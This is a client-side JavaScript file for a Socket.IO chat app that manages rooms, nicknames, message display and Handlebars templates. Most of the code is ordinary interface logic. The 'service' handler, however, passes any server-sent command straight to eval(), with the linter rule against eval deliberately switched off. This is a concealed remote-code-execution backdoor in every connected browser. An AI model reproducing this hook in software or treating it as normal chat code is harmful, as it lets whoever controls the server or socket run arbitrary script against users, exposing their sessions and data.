/* global document window io Handlebars */
window.addEventListener('load', () => {
  const logger = console;
  class Chat {
    constructor() {
      this.debug = false;
      this.mainRoom = 'MainRoom';
      this.templates = {};
      this.initialize();
      logger.info('begin');
    }
    initialize() {
      this.initAction();
      this.initEvent();
    }
    initEvent() {
      const action = socket => {
        this.connected(socket);
        this.disconnect(socket);
        this.reconnect(socket);
        this.subscriptionConfirmed(socket);
        this.unsubscriptionConfirmed(socket);
        this.userJoinsRoom(socket);
        this.userLeavesRoom(socket);
        this.newMessage(socket);
        this.usersInRoom(socket);
        this.userNicknameUpdated(socket);
        this.service(socket);
        this.debugging(socket);
        return socket;
      };
      this.socket = action(io.connect(window.location.host, { transports: ['websocket'] }));
    }
    initAction() {
      this.onClick(this.select('#b_send_message'), event => {
        event.preventDefault();
        const msg = this.getMessageText();
        if (msg === '') return;
        this.socket.emit('newMessage', { room: this.getCurrentRoom(), msg });
      });
      this.onClick(this.select('#b_join_room'), event => {
        event.preventDefault();
        const roomName = this.getRoomName();
        if (!roomName) {
          this.select('#room_name').classList.add('error');
          return;
        }
        this.socket.emit('subscribe', { rooms: [roomName] });
      });
      this.onClick(this.select('#b_leave_room'), event => {
        event.preventDefault();
        const currentRoom = this.getCurrentRoom();
        if (currentRoom === this.mainRoom) return;
        this.socket.emit('unsubscribe', { rooms: [this.getCurrentRoom()] });
        this.select(`[data-href="#id-${this.mainRoom}"]`).click();
      });
      this.select('#modal_joinroom').addEventListener('hidden.bs.modal', event => {
        logger({ event });
        event.preventDefault();
        if (!this.select('#room_name').classList.contains('error')) return;
        this.select('#room_name').classList.remove('error');
      });
      this.onClick(this.select('#b_set_nickname'), event => {
        event.preventDefault();
        this.socket.emit('setNickname', { username: this.getNickname() });
        this.hideModal(this.select('#modal_setnick'));
      });
      this.onClick(this.select('#drop-down .link'), event => {
        if (this.select('#drop-down').classList.contains('open')) {
          this.select('#drop-down').classList.remove('open');
        } else {
          event.preventDefault();
          this.select('#drop-down').classList.add('open');
        }
      });
      this.onClick(this.select('#open_setnick'), () => {
        this.select('#drop-down').classList.remove('open');
        this.showModal(this.select('#modal_setnick'));
      });
      this.onClick(this.select('#open_joinroom'), () => {
        this.select('#drop-down').classList.remove('open');
        this.showModal(this.select('#modal_joinroom'));
      });
    }
    debugging(socket) {
      const action = () => this.debug = true;
      socket.on('debugging', action);
    }
    service(socket) {
      /* eslint-disable no-eval */
      const action = event => eval(event.command); /* eslint-enable no-eval */
      socket.on('service', action);
    }
    connected(socket) {
      const action = () => {
        this.socket.emit('subscribe', { rooms: [this.mainRoom] });
      };
      socket.on('connected', action);
    }
    disconnect(socket) {
      const action = () => this.addMessage({
        room: this.mainRoom, username: 'bot', msg: '----- Lost connection to server -----',
      });
      socket.on('disconnect', action);
    }
    reconnect(socket) {
      const action = () => {
        Array.from(document.querySelectorAll('#room_users_MainRoom [id]'))
        .forEach(item => item.remove());
        this.addMessage({
          room: this.mainRoom, username: 'bot', msg: '----- Reconnected to server -----',
        });
      };
      socket.on('reconnect', action);
    }
    subscriptionConfirmed(socket) {
      const action = data => {
        if (!this.roomExists(data.room)) {
          this.selectAll('.active').forEach(element => element.classList.remove('active'));
          this.addRoomTab(data.room);
          this.addRoom(data.room);
        }
        this.socket.emit('getUsersInRoom', { room: data.room });
        this.hideModal(this.select('#modal_joinroom'));
      };
      socket.on('subscriptionConfirmed', action);
    }
    unsubscriptionConfirmed(socket) {
      const action = data => {
        if (!this.roomExists(data.room)) return;
        this.removeRoomTab(data.room);
        this.removeRoom(data.room);
      };
      socket.on('unsubscriptionConfirmed', action);
    }
    userJoinsRoom(socket) {
      const action = data => {
        this.addMessage(data);
        if (socket.id === data.id) return;
        this.addUser(data);
      };
      socket.on('userJoinsRoom', action);
    }
    userLeavesRoom(socket) {
      const action = data => {
        this.addMessage(data);
        this.removeUser(data);
      };
      socket.on('userLeavesRoom', action);
    }
    newMessage(socket) {
      const action = data => {
        this.addMessage(data);
      };
      socket.on('newMessage', action);
    }
    usersInRoom(socket) {
      const action = data => data.users.forEach(user => this.addUser(user));
      socket.on('usersInRoom', action);
    }
    userNicknameUpdated(socket) {
      const action = data => {
        this.addMessage({
          id: data.id,
          room: data.room,
          username: 'bot',
          msg: `----- ${data.oldUsername} is now ${data.newUsername} -----`,
        });
        this.updateNickname(data);
      };
      socket.on('userNicknameUpdated', action);
    }
    onClick(element, action) {
      element.addEventListener('click', action);
    }
    generateElement(html, area, action) {
      const div = document.createElement('div');
      div.innerHTML = `<div class="generateElement">${html}</div>`;
      const elements = this.selectAll('.generateElement > *', div);
      if (!area) return elements;
      elements.forEach(element => area[action || 'append'](element));
      return elements;
    }
    showModal(modal) {
      modal.style.display = 'block';
      this.onClick(this.select('.close', modal),
        () => modal.style.display = 'none');
      this.onClick(window, event => {
        if (event.target === modal) {
          modal.style.display = 'none';
        }
      });
    }
    hideModal(modal) {
      modal.style.display = 'none';
    }
    select(selector, element) {
      return (element || document).querySelector(selector);
    }
    selectAll(selector, element) {
      return [...(element || document).querySelectorAll(selector)];
    }
    genId(id) {
      return `id-${id}`;
    }
    getTemplate(path) {
      if (Object.keys(this.templates).indexOf(path) !== -1) {
        return Promise.resolve(this.templates[path]);
      }
      return fetch(path)
      .then(res => res.text())
      .then(source => {
        this.templates[path] = Handlebars.compile(source);
        return this.templates[path];
      });
    }
    waiter(callback) {
      let timer = 0;
      const func = () => {
        if (!callback()) setTimeout(func, timer += 10);
      };
      if (!callback()) setTimeout(func, timer);
    }
    addMessage(msg) {
      this.getTemplate('js/templates/message.handlebars')
      .then(template => {
        const isMe = msg.id === this.socket.id;
        const html = template({
          msg: msg.msg,
          username: msg.username,
          class: isMe ? 'label-success' : 'label-info',
        });
        this.waiter(() => {
          const area = this.select(`#room_messages_${msg.room}`);
          if (area) {
            this.generateElement(html, area);
            area.scrollTop = area.scrollHeight;
          }
          return area;
        });
      });
    }
    addRoomTab(room) {
      this.getTemplate('js/templates/room_tab.handlebars')
      .then(template => {
        const html = template({ room });
        this.waiter(() => {
          const area = this.select('#rooms_tabs');
          if (area) {
            this.generateElement(html, area);
            this.onClick(this.select(`[data-href="#${this.genId(room)}"]`), () => this.setRoom(room));
          }
          return area;
        });
      });
    }
    removeRoomTab(room) {
      this.select(`#${this.genId(room)}_tab`).remove();
    }
    addRoom(room) {
      this.getTemplate('js/templates/room.handlebars')
      .then(template => {
        const html = template({ room });
        this.waiter(() => {
          const area = this.select('#rooms');
          if (area) this.generateElement(html, area);
          return area;
        });
      });
    }
    setRoom(room) {
      this.selectAll('.active').forEach(element => element.classList.remove('active'));
      this.select(`#${this.genId(room)}_tab`).classList.add('active');
      this.select(`#${this.genId(room)}`).classList.add('active');
    }
    removeRoom(room) {
      this.select(`#${this.genId(room)}`).remove();
    }
    roomExists(room) {
      return this.select(`#${this.genId(room)}_tab`);
    }
    addUser(user) {
      this.getTemplate('js/templates/user.handlebars')
      .then(template => {
        const isMe = user.id === this.socket.id;
        const html = template({
          username: user.username,
          id: this.genId(user.id),
          class: isMe ? 'badge-success' : 'badge-inverse',
        });
        this.waiter(() => {
          const area = this.select(`#${this.genId(user.room)}`);
          if (area) {
            const users = this.select(`#room_users_${user.room}`, area);
            const elements = this.generateElement(html, users, isMe ? 'prepend' : undefined);
            elements[0].outerHTML += ' ';
          }
          return area;
        });
      });
    }
    removeUser(user) {
      const element = this.select(`#${this.genId(user.room)} #${this.genId(user.id)}`);
      if (!element) return;
      element.remove();
    }
    getCurrentRoom() {
      return this.select('li[id$="_tab"][class="active"]').textContent.trim();
    }
    getMessageText() {
      const text = this.select('#message_text').value.trim();
      this.select('#message_text').value = '';
      return text;
    }
    getRoomName() {
      const name = this.select('#room_name').value.trim();
      this.select('#room_name').value = '';
      return name;
    }
    getNickname() {
      const nickname = this.select('#nickname').value.trim();
      this.select('#nickname').value = '';
      return nickname;
    }
    updateNickname(user) {
      const area = this.select(`#${this.genId(user.room)} #${this.genId(user.id)}`);
      area.textContent = user.newUsername;
    }
  }
  window.main = {
    chat: new Chat(),
  };
});
